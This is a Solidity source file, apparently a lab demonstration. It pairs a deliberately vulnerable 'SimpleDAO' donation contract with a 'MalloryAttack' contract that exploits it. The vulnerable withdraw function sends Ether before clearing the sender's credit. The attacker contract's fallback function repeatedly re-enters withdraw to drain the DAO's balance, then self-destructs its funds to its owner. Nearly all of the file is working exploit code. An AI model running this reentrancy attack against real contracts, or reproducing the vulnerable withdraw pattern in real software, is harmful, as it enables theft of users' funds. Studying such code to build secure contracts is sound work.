pragma solidity ^0.4.4;

contract SimpleDAO{

	address owner;
	address public participant;

	uint public amout;

	mapping (address => uint) credit;

	function SimpleDAO() payable {
		donate();		
	}

	function donate() payable returns (bool){
		participant = msg.sender;
		amout = msg.value;
		credit[msg.sender] += msg.value;
		return true;
	}

	function withdraw() {
		if (!msg.sender.call.value(credit[msg.sender])()) {
       			revert();
		}
		credit[msg.sender] = 0;
	}
}



contract MalloryAttack{

	//the SimpleDAO’s address.
	SimpleDAO public dao = SimpleDAO(0x8a0A8d81192264B0E436b57D30f472A6468780EF);

	address owner;

	function MalloryAttack() {owner = msg.sender;}

	function MalloryCollect() payable {
		dao.donate.value(msg.value)();
		dao.withdraw();
	}
	//recursion here when call withdraw without credit decrease.
	function() payable {
		if(dao.balance >= msg.value){
			dao.withdraw();
		}
	}

  	function kill () {suicide(owner);}
}
